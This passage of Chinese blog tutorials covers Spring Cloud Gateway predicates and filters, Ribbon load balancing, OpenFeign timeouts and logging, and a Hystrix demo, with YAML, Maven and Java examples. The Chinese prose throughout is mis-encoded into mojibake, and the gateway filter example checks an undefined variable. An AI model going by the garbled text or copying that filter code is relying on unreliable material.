spring: application: name: cloud-gateway cloud: gateway: discovery: locator: enabled: true #å¼€å¯ä»æ³¨å†Œä¸­å¿ƒåŠ¨æ€åˆ›å»ºè·¯ç”±çš„åŠŸèƒ½ï¼Œåˆ©ç”¨å¾®æœåŠ¡åè¿›è¡Œè·¯ç”± routes: - id: payment_routh #è·¯ç”±çš„IDï¼Œæ²¡æœ‰å›ºå®šè§„åˆ™ä½†è¦æ±‚å”¯ä¸€ï¼Œå»ºè®®é…åˆæœåŠ¡å #uri: http://localhost:8001 #åŒ¹é…åæä¾›æœåŠ¡çš„è·¯ç”±åœ°å€ uri: lb://cloud-payment-service predicates: - Path=/payment/get/** #æ–­è¨€,è·¯å¾„ç›¸åŒ¹é…çš„è¿›è¡Œè·¯ç”± - id: payment_routh2 #uri: http://localhost:8001 #åŒ¹é…åæä¾›æœåŠ¡çš„è·¯ç”±åœ°å€ uri: lb://cloud-payment-service predicates: - Path=/payment/lb/** #æ–­è¨€,è·¯å¾„ç›¸åŒ¹é…çš„è¿›è¡Œè·¯ç”± eureka: instance: hostname: cloud-gateway-service client: service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka éœ€è¦æ³¨æ„çš„æ˜¯uriçš„åè®®ä¸ºlbï¼Œè¡¨ç¤ºå¯ç”¨Gatewayçš„è´Ÿè½½å‡è¡¡åŠŸèƒ½ã€‚ lb://serviceNameæ˜¯spring cloud gatewayåœ¨å¾®æœåŠ¡ä¸­è‡ªåŠ¨ä¸ºæˆ‘ä»¬åˆ›å»ºçš„è´Ÿè½½å‡è¡¡uri æµ‹è¯• http://localhost:9527/payment/lb 8001/8002ä¸¤ä¸ªç«¯å£åˆ‡æ¢ Predicateçš„ä½¿ç”¨1597054276153 1597054330113 1597054313552 1597054346178 å¸¸ç”¨çš„Route PredicateAfter Route Predicate - After=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] # åœ¨ï¼Ÿï¼Ÿï¼Ÿæ—¶é—´åç”Ÿæ•ˆ æ—¶é—´å¯ä»¥è¿™æ ·è·å–ï¼š ZonedDateTime zbj = ZonedDateTime.now(); System.out.println(zbj); Before Route Predicate - After=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] - Before=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] Between Route Predicate - Between=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] , 2020-03-08T10:59:34.102+08:00[Asia/Shanghai] Cookie Route Predicate1597054584109 - Cookie=username,kayleh #å¹¶ä¸”Cookieæ˜¯username=kaylehæ‰èƒ½è®¿é—® 1597054626731 ä¸å¸¦cookiesè®¿é—® -&gt; cmd curl http://localhost:9527/payment/lb curl http://localhost:9527/payment/lb --cookie &quot;username,kayleh&quot; #è¿”å›ç«¯å£å·è¡¨ç¤ºè®¿é—®æˆåŠŸ å¸¦ä¸Šcookiesè®¿é—® åŠ å…¥curlè¿”å›ä¸­æ–‡ä¹±ç  https://blog.csdn.net/leedee/article/details/82685636 Header Route Predicate- Header=X-Request-Id, \\d+ #è¯·æ±‚å¤´ä¸­è¦æœ‰X-Request-Idå±æ€§å¹¶ä¸”å€¼ä¸ºæ•´æ•°çš„æ­£åˆ™è¡¨è¾¾å¼ 1597054747638 1597054756074 Host Route Predicate - Host=**.atguigu.com Method Route Predicate - Method=GET Path Route PredicateQuery Route Predicate - Query=username, \\d+ #è¦æœ‰å‚æ•°åç§°å¹¶ä¸”æ˜¯æ­£æ•´æ•°æ‰èƒ½è·¯ç”± æµ‹è¯• curl http://localhost:9527/payment/lb?username=1 curl http://localhost:9527/payment/lb?username=-1 ALL server: port: 9527 spring: application: name: cloud-gateway cloud: gateway: discovery: locator: enabled: true #å¼€å¯ä»æ³¨å†Œä¸­å¿ƒåŠ¨æ€åˆ›å»ºè·¯ç”±çš„åŠŸèƒ½ï¼Œåˆ©ç”¨å¾®æœåŠ¡åè¿›è¡Œè·¯ç”± routes: - id: payment_routh #è·¯ç”±çš„IDï¼Œæ²¡æœ‰å›ºå®šè§„åˆ™ä½†è¦æ±‚å”¯ä¸€ï¼Œå»ºè®®é…åˆæœåŠ¡å #uri: http://localhost:8001 #åŒ¹é…åæä¾›æœåŠ¡çš„è·¯ç”±åœ°å€ uri: lb://cloud-payment-service predicates: - Path=/payment/get/** #æ–­è¨€,è·¯å¾„ç›¸åŒ¹é…çš„è¿›è¡Œè·¯ç”± - id: payment_routh2 #uri: http://localhost:8001 #åŒ¹é…åæä¾›æœåŠ¡çš„è·¯ç”±åœ°å€ uri: lb://cloud-payment-service predicates: - Path=/payment/lb/** #æ–­è¨€,è·¯å¾„ç›¸åŒ¹é…çš„è¿›è¡Œè·¯ç”± #- After=2020-03-08T10:59:34.102+08:00[Asia/Shanghai] #- Cookie=username,zhangshuai #å¹¶ä¸”Cookieæ˜¯username=zhangshuaiæ‰èƒ½è®¿é—® #- Header=X-Request-Id, \\d+ #è¯·æ±‚å¤´ä¸­è¦æœ‰X-Request-Idå±æ€§å¹¶ä¸”å€¼ä¸ºæ•´æ•°çš„æ­£åˆ™è¡¨è¾¾å¼ #- Host=**.atguigu.com #- Method=GET #- Query=username, \\d+ #è¦æœ‰å‚æ•°åç§°å¹¶ä¸”æ˜¯æ­£æ•´æ•°æ‰èƒ½è·¯ç”± eureka: instance: hostname: cloud-gateway-service client: service-url: register-with-eureka: true fetch-registry: true defaultZone: http://eureka7001.com:7001/eureka è¯´ç™½äº†ï¼ŒPredicateå°±æ˜¯ä¸ºäº†å®ç°ä¸€ç»„åŒ¹é…è§„åˆ™ï¼Œ è®©è¯·æ±‚è¿‡æ¥æ‰¾åˆ°å¯¹åº”çš„Routeè¿›è¡Œå¤„ç† Filteræ˜¯ä»€ä¹ˆï¼Ÿ 1597068671697 ç”Ÿå‘½å‘¨æœŸpre åœ¨ä¸šåŠ¡é€»è¾‘ä¹‹å‰ post åœ¨ä¸šåŠ¡é€»è¾‘ä¹‹å ç§ç±»GatewayFilter å•ä¸€ GlobalFilter å…¨å±€ å¸¸ç”¨çš„GatewayFilterAddRequestParameter ymlï¼š 1597068815115 è‡ªå®šä¹‰è¿‡æ»¤å™¨è‡ªå®šä¹‰å…¨å±€GlobalFilterä¸¤ä¸ªä¸»è¦æ¥å£ä»‹ç»impiemerts GlobalFilter ï¼ŒOrdered èƒ½å¹²å˜›å…¨å±€æ—¥å¿—è®°å½• ç»Ÿä¸€ç½‘å…³é‰´æƒ ã€‚ã€‚ã€‚ æ¡ˆä¾‹ï¼š package com.kayleh.springcloud.filter; import lombok.extern.slf4j.Slf4j; import org.springframework.cloud.gateway.filter.GatewayFilterChain; import org.springframework.cloud.gateway.filter.GlobalFilter; import org.springframework.core.Ordered; import org.springframework.http.HttpStatus; import org.springframework.stereotype.Component; import org.springframework.util.StringUtils; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; import java.util.Date; @Component @Slf4j public class MyLogGateWayFilter implements GlobalFilter,Ordered { @Override public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) { log.info(&quot;*********come in MyLogGateWayFilter: &quot;+new Date()); String uname = exchange.getRequest().getQueryParams().getFirst(&quot;username&quot;); if(StringUtils.isEmpty(username)){ log.info(&quot;*****ç”¨æˆ·åä¸ºNull éæ³•ç”¨æˆ·,(â”¬ï¼¿â”¬)&quot;); exchange.getResponse().setStatusCode(HttpStatus.NOT_ACCEPTABLE);//ç»™äººå®¶ä¸€ä¸ªå›åº” return exchange.getResponse().setComplete(); } return chain.filter(exchange); } @Override public int getOrder() { return 0; } } å¯åŠ¨ï¼š 1597068959493 æµ‹è¯•ï¼š æ­£ç¡®ï¼šhttp://localhost:9527/payment/lb?uname=z3 é”™è¯¯ http://localhost:9527/payment/lb","categories":[{"name":"åˆ†å¸ƒå¼","slug":"åˆ†å¸ƒå¼","permalink":"https://blog.kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://blog.kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Ribbonè´Ÿè½½å‡è¡¡æœåŠ¡è°ƒç”¨ã€æœåŠ¡é™çº§","slug":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„3","date":"2020-08-14T07:14:13.000Z","updated":"2021-04-11T17:11:28.690Z","comments":true,"path":"åˆ†å¸ƒå¼çš„å¾®æœåŠ¡æ¶æ„3/","link":"","permalink":"https://blog.kayleh.top/%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%843/","excerpt":"Ribbonè´Ÿè½½å‡è¡¡æœåŠ¡è°ƒç”¨ã€æœåŠ¡é™çº§","text":"Ribbonè´Ÿè½½å‡è¡¡æœåŠ¡è°ƒç”¨ã€æœåŠ¡é™çº§ 1596715648722 LB(è´Ÿè½½å‡è¡¡) 1596726399842 é›†ä¸­å¼LBå³åœ¨æœåŠ¡çš„æ¶ˆè´¹æ–¹å’Œæä¾›æ–¹ä¹‹é—´ä½¿ç”¨ç‹¬ç«‹çš„LBè®¾æ–½(å¯ä»¥æ˜¯ç¡¬ä»¶,å¦‚F5,ä¹Ÿå¯ä»¥æ˜¯è½¯ä»¶,å¦‚nginx),ç”±è¯¥è®¾æ–½è´Ÿè´£æŠŠè®¿é—®è¯·æ±‚é€šè¿‡æŸç§ç­–ç•¥è½¬å‘è‡³æœåŠ¡çš„æä¾›æ–¹. è¿›ç¨‹å†…LBå°†é€»è¾‘é›†æˆåˆ°æ¶ˆè´¹æ–¹,æ¶ˆè´¹æ–¹ä»æœåŠ¡æ³¨å†Œä¸­å¿ƒè·çŸ¥æœ‰å“ªäº›åœ°å€å¯ç”¨,ç„¶åè‡ªå·±å†ä»è¿™äº›åœ°å€ä¸­é€‰æ‹©å‡ºä¸€ä¸ªåˆé€‚çš„æœåŠ¡å™¨. Ribbonå°±å±äºè¿›ç¨‹å†…LB,å®ƒåªæ˜¯ä¸€ä¸ªç±»åº“,é›†æˆäºæ¶ˆè´¹æ–¹è¿›ç¨‹,æ¶ˆè´¹æ–¹é€šè¿‡å®ƒæ¥è·å–æœåŠ¡æä¾›æ–¹çš„åœ°å€. å°±æ˜¯ è´Ÿè½½å‡è¡¡+RestTemplateè°ƒç”¨. è´Ÿè½½å‡è¡¡æ¼”ç¤ºRibbonå…¶å®å°±æ˜¯ä¸€ä¸ªè½¯è´Ÿè½½å‡è¡¡çš„å®¢æˆ·ç«¯ç»„ä»¶,ä»–å¯ä»¥å’Œå…¶ä»–æ‰€éœ€è¯·æ±‚çš„å®¢æˆ·ç«¯ç»“åˆä½¿ç”¨,å’Œeurekaç»“åˆåªæ˜¯å…¶ä¸­çš„ä¸€ä¸ªå®ä¾‹. æ¶æ„: Ribbonå·¥ä½œæ—¶åˆ†æˆä¸¤æ­¥ ç¬¬ä¸€æ­¥å…ˆé€‰æ‹©EurekaServer,å®ƒä¼˜å…ˆé€‰æ‹©åœ¨åŒä¸€åŒºåŸŸå†…è´Ÿè½½è¾ƒå°‘çš„server ç¬¬äºŒæ­¥å†æ ¹æ®ç”¨æˆ·æŒ‡å®šçš„ç­–ç•¥,åœ¨ä»serverå–åˆ°çš„æœåŠ¡æ³¨å†Œåˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªåœ°å€. å…¶ä¸­Ribbonæä¾›äº†å¤šç§ç­–ç•¥:æ¯”å¦‚è½®è¯¢,éšæœºå’Œæ ¹æ®å“åº”æ—¶é—´åŠ æƒ. 1596727714256 æ–°ç‰ˆçš„eurekaæ•´åˆäº†Ribbon &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt; &lt;/dependency&gt; RestTemplate1596728066428 getForObjectå’ŒgetForEntity: 1596728100814 @GetMapping(&quot;/consumer/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPayment(@PathVariable(&quot;id&quot;) Long id) { return restTemplate.getForObject(PAYMENT_URL + &quot;/payment/get/&quot; + id, CommonResult.class); } @GetMapping(&quot;/consumer/payment/getForEntity/{id}&quot;) public CommonResult&lt;Payment&gt; getPayment2(@PathVariable(&quot;id&quot;) Long id) { ResponseEntity&lt;CommonResult&gt; entity = restTemplate.getForEntity(PAYMENT_URL + &quot;/payment/get/&quot; + id, CommonResult.class); if (entity.getStatusCode().is2xxSuccessful()) { log.info(entity.getStatusCode()+&quot;\\t&quot;+entity.getHeaders()); return entity.getBody(); } else { return new CommonResult&lt;&gt;(444,&quot;æ“ä½œå¤±è´¥&quot;); } } IRuleï¼šæ ¹æ®ç‰¹å®šç®—æ³•ä¸­ä»æœåŠ¡åˆ—è¡¨ä¸­é€‰å–ä¸€ä¸ªè¦è®¿é—®çš„æœåŠ¡1596781514760 1596781613909 ä¿®æ”¹cloyud-consumer-order80 1596781758399 @SpringBootApplicationé‡Œæœ‰@ComponentScanæ³¨è§£,ä¸èƒ½å’Œä¸»å¯åŠ¨ç±»æ”¾åœ¨åŒä¸€åŒ…ä¸‹ æ–°å»ºpackage com.kayleh.myrule æ–°å»ºMySelfRule package com.kayleh.myrule; import com.netflix.loadbalancer.IRule; import com.netflix.loadbalancer.RandomRule; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; /** * @Author: Wizard * @Date: 2020/8/7 14:33 */ @Configuration public class MySelfRule { @Bean public IRule myRule() { return new RandomRule();//å®šä¹‰ä¸ºéšæœº } } ä¸»å¯åŠ¨ç±»æ·»åŠ @RibbonClient @SpringBootApplication @EnableEurekaClient @RibbonClient(name = &quot;CLOUD-PAYMENT-SERVICE&quot;, configuration = MySelfRule.class) public class OrderMain80 { public static void main(String[] args) { SpringApplication.run(OrderMain80.class, args); } } æµ‹è¯• http://localhost/consumer/payment/get/1 Ribbonè´Ÿè½½å‡è¡¡ç®—æ³•1596786871454 Ribbonæ‰‹å†™è½®è¯¢ç®—æ³• OpenFeignFeignæ˜¯ä¸€ä¸ªå£°æ˜å¼WebServiceå®¢æˆ·ç«¯ã€‚ä½¿ç”¨Feignèƒ½è®©ç¼–å†™Web Serviceå®¢æˆ·ç«¯æ›´åŠ ç®€å•ã€‚ å®ƒçš„ä½¿ç”¨æ–¹æ³•æ˜¯å®šä¹‰ä¸€ä¸ªæœåŠ¡æ¥å£ç„¶ååœ¨ä¸Šé¢æ·»åŠ æ³¨è§£ã€‚Feignä¹Ÿæ”¯æŒå¯æ‹”æ’å¼çš„ç¼–ç å™¨å’Œè§£ç å™¨ã€‚Spring Cloudå¯¹Feignè¿›è¡Œäº†å°è£…ï¼Œä½¿å…¶æ”¯æŒäº†Spring MVCæ ‡å‡†æ³¨è§£å’ŒHttpMessageConvertersã€‚Feignå¯ä»¥ä¸Eurekaå’ŒRibbonç»„åˆä½¿ç”¨ä»¥æ”¯æŒè´Ÿè½½å‡è¡¡ã€‚ 1596790462395 feignå’ŒOpenFeign1596803520990 1596811655732 OpenFeignæœåŠ¡è°ƒç”¨æ¥å£+æ³¨è§£æ–°å»ºcloud-consumer-feign-order80 pom.xml &lt;dependencies&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 80 eureka: client: register-with-eureka: false service-url: defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ ä¸»å¯åŠ¨ç±»ï¼š package com.kayleh.springcloud; /** * @Author: Wizard * @Date: 2020/8/4 11:20 */ @SpringBootApplication @EnableFeignClients public class OrderFeignMain80 { public static void main(String[] args) { SpringApplication.run(OrderFeignMain80.class, args); } } Service: package com.kayleh.springcloud.service; @Component @FeignClient(&quot;CLOUD-PAYMENT-SERVICE&quot;) public interface PaymentFeignService { @GetMapping(value = &quot;/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(&quot;id&quot;) Long id); } Controller package com.kayleh.springcloud.controller; @RestController @Slf4j public class OrderFeignController { @Resource private PaymentFeignService paymentFeignService; @GetMapping(value = &quot;/consumer/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(&quot;id&quot;) Long id) { return paymentFeignService.getPaymentById(id); } } æµ‹è¯• http://localhost/consumer/payment/get/1 OpenFeignè¶…æ—¶æ§åˆ¶ä¿®æ”¹cloud-provider-payment8001çš„controllerï¼Œæ·»åŠ  @GetMapping(value = &quot;/payment/feign/timeout&quot;) public String getPaymentFeignTimeout() { //æš‚åœå‡ ç§’é’Ÿçº¿ç¨‹ try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); } return serverPort; } cloud-consumer-feign-order80çš„PaymentFeignServiceæ¥å£ï¼š @Component @FeignClient(&quot;CLOUD-PAYMENT-SERVICE&quot;) public interface PaymentFeignService { @GetMapping(value = &quot;/payment/get/{id}&quot;) public CommonResult&lt;Payment&gt; getPaymentById(@PathVariable(&quot;id&quot;) Long id); @GetMapping(value = &quot;/payment/feign/timeout&quot;) public String getPaymentFeignTimeout(); } cloud-consumer-feign-order80çš„OrderFeignControllerï¼Œæ·»åŠ ï¼š @GetMapping(value = &quot;/consumer/payment/feign/timeout&quot;) public String getPaymentFeignTimeout() { //å®¢æˆ·ç«¯é»˜è®¤ç­‰å¾…1ç§’é’Ÿ return paymentFeignService.getPaymentFeignTimeout(); } è®¿é—® http://localhost:8001/payment/feign/timeout http://localhost/consumer/payment/feign/timeout #æŠ¥é”™ 1596809432122 OpenFeigné»˜è®¤æ”¯æŒRibbon OpenFeigné»˜è®¤ç­‰å¾…1ç§’é’Ÿï¼Œè¶…è¿‡åæŠ¥é”™ é»˜è®¤Feignå®¢æˆ·ç«¯åªç­‰å¾…1ç§’é’Ÿ,ä½†æ˜¯æœåŠ¡ç«¯å¤„ç†éœ€è¦ç­‰å¾…è¶…è¿‡1ç§’é’Ÿ,å¯¼è‡´Feignå®¢æˆ·ç«¯ä¸æƒ³ç­‰å¾…äº†,ç›´æ¥è¿”å›æŠ¥é”™. ä¸ºäº†é¿å…è¿™æ ·çš„æƒ…å†µ,æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦è®¾ç½®Feignå®¢æˆ·ç«¯çš„è¶…æ—¶æ§åˆ¶. ymlæ–‡ä»¶ä¸­å¼€å¯é…ç½® ä¿®æ”¹cloud-consumer-feign-order80çš„yaml server: port: 80 eureka: client: register-with-eureka: false service-url: defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ #è®¾ç½®feignå®¢æˆ·ç«¯è¶…æ—¶æ—¶é—´(OpenFeigné»˜è®¤æ”¯æŒRibbon) ribbon: #æŒ‡çš„æ˜¯å»ºç«‹è¿æ¥æ‰€ç”¨çš„æ—¶é—´,ä½¿ç”¨äºç½‘ç»œçŠ¶å†µæ­£å¸¸çš„æƒ…å†µä¸‹,ä¸¤ç«¯è¿æ¥æ‰€ç”¨çš„æ—¶é—´ ReadTimeout: 5000 #æŒ‡çš„æ˜¯å»ºç«‹è¿æ¥åä»æœåŠ¡ç«¯è¯»å–åˆ°å¯ç”¨èµ„æºæ‰€ç”¨çš„æ—¶é—´ ConnectTimeout: 5000 å†æµ‹è¯• http://localhost/consumer/payment/feign/timeout OpenFeignæ—¥å¿—æ‰“å°åŠŸèƒ½Feignæä¾›äº†æ—¥å¿—æ‰“å°åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡é…ç½®æ¥è°ƒæ•´æ—¥å¿—çº§åˆ«ï¼Œä»è€Œäº†è§£Feignä¸­Httpè¯·æ±‚çš„ç»†èŠ‚ã€‚è¯´ç™½äº†å°±æ˜¯å¯¹Feignæ¥å£çš„è°ƒç”¨æƒ…å†µè¿›è¡Œç›‘æ§å’Œè¾“å‡º 1596812081019 åœ¨cloud-consumer-feign-order80çš„FeignConfigä¸­æ·»åŠ  package com.kayleh.springcloud.config; import feign.Logger; import org.springframework.cloud.client.loadbalancer.LoadBalanced; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.web.client.RestTemplate; /** * @Author: Wizard * @Date: 2020/8/4 12:54 */ @Configuration public class FeignConfig { @Bean Logger.Level feignLoggerLevel() { return Logger.Level.FULL; } } ä¿®æ”¹yamlæ–‡ä»¶ server: port: 80 eureka: client: register-with-eureka: false service-url: defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ #è®¾ç½®feignå®¢æˆ·ç«¯è¶…æ—¶æ—¶é—´(OpenFeigné»˜è®¤æ”¯æŒRibbon) ribbon: #æŒ‡çš„æ˜¯å»ºç«‹è¿æ¥æ‰€ç”¨çš„æ—¶é—´,ä½¿ç”¨äºç½‘ç»œçŠ¶å†µæ­£å¸¸çš„æƒ…å†µä¸‹,ä¸¤ç«¯è¿æ¥æ‰€ç”¨çš„æ—¶é—´ ReadTimeout: 5000 #æŒ‡çš„æ˜¯å»ºç«‹è¿æ¥åä»æœåŠ¡ç«¯è¯»å–åˆ°å¯ç”¨èµ„æºæ‰€ç”¨çš„æ—¶é—´ ConnectTimeout: 5000 logging: level: # feignä»¥ä»€ä¹ˆçº§åˆ«ç›‘æ§å“ªä¸ªæ¥å£ com.kayleh.springcloud.service.PaymentFeignService: debug å³å¯å¼€å¯æ—¥å¿—åŠŸèƒ½ã€‚ HystrixæœåŠ¡è°ƒç”¨1596861908224 1596861970345 æ¡ˆä¾‹:æ–°å»ºcloud-provider-hystrix-payment8001 pom.xml &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;${project.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- çƒ­éƒ¨ç½²--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; yml server: port: 8001 spring: application: name: cloud-provider-hystrix-payment eureka: client: register-with-eureka: true fetch-registry: true service-url: # defaultZone: http://localhost:7001/eureka/ defaultZone: http://eureka7001.com:7001/eureka/,http://eureka7002.com:7002/eureka/ service package com.kayleh.springcloud.service; import com.kayleh.springcloud.entities.Payment; import org.apache.ibatis.annotations.Param; import org.springframework.stereotype.Service; import java.util.concurrent.TimeUnit; @Service public class PaymentService { public String paymentInfo_OK(Integer id) { return &quot;çº¿ç¨‹æ± : &quot; + Thread.currentThread().getName() + &quot; paymentInfo_OK,id: &quot; + id + &quot;\\t&quot; + &quot;O(âˆ©_âˆ©)Oå“ˆå“ˆ~&quot;; } public String paymentInfo_TimeOut(Integer id) { //æš‚åœ3ç§’é’Ÿ int timeNumber = 3; try { TimeUnit.SECONDS.sleep(timeNumber); } catch (InterruptedException e) { e.printStackTrace(); } return &quot;çº¿ç¨‹æ± : &quot; + Thread.currentThread().getName() + &quot; paymentInfo_TimeOut,id: &quot; + id + &quot;\\t&quot; + &quot;o(â•¥ï¹â•¥)oå“­&quot; + &quot;è€—æ—¶&quot; + timeNumber + &quot;ç§’é’Ÿ&quot;; } } controller @RestController @Slf4j public class PaymentController { @Resource private PaymentService paymentService; @Value(&quot;${server.port}&quot;) private String serverPort; @PostMapping(value = &quot;/payment/hystrix/ok/{id}&quot;) public String paymentInfo_OK(@PathVariable(&quot;id&quot;) Integer id) { String result = paymentService.paymentInfo_OK(id); log.info(&quot;----------result:&quot; + result); return result; } @GetMapping(value = &quot;/payment/hystrix/timeout/{id}&quot;) public String paymentInfo_TimeOut(@PathVariable(&quot;id&quot;) Integer id) { String result = paymentService.paymentInfo_TimeOut(id); log.info(&quot;----------result:&quot; + result); return result; } } æµ‹è¯• localhost:8001/payment/hystrix/ok/{id} localhost:8001/payment/hystrix/timeout/{id} ä»¥ä¸Šè¿°ä¸ºæ ¹åŸºå¹³å°ï¼Œä»æ­£ç¡® â€”&gt;é”™è¯¯ â€”&gt; é™çº§ç†”æ–­ â€”&gt; æ¢å¤ Jmeterå‹æµ‹æµ‹è¯•å¼€å¯ Jmeterï¼Œæ¥20000ä¸ªå¹¶å‘å‹æ­»8001ï¼Œ20000ä¸ªè¯·æ±‚éƒ½å»è®¿é—®paymentInfo_TimeOut 1596866230258 http://localhost:8001/payment/hystrix/timeout/1 è¿™æ—¶è®¿é—® http://localhost:8001/payment/hystrix/ok/1 è®¿é—®å¼€å§‹å˜æ…¢äº† è¿™åªæ˜¯æœåŠ¡æä¾›è€…8001è‡ªå·±æµ‹è¯•ï¼Œå‡å¦‚æ­¤æ—¶å¤–éƒ¨çš„æ¶ˆè´¹è€…80ä¹Ÿæ¥è®¿é—®ï¼Œé‚£æ¶ˆè´¹è€…åªèƒ½å¹²ç­‰ï¼Œæœ€ç»ˆå¯¼è‡´æ¶ˆè´¹ç«¯80ä¸æ»¡æ„ï¼ŒæœåŠ¡ç«¯8001ç›´æ¥è¢«æ‹–æ­»ã€‚ æ–°å»ºcloud-consumer-feign-hystrix-order80 pom.xml &lt;dependencies&gt; &lt;!--openfeign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- eureka-client--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt;&lt;!--å¼•å…¥è‡ªå·±å®šä¹‰çš„apié€šç”¨åŒ…ï¼Œå¯ä»¥ä½¿ç”¨Paymentæ”¯ä»˜Entity--&gt; &lt;groupId&gt;com.kayleh.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; 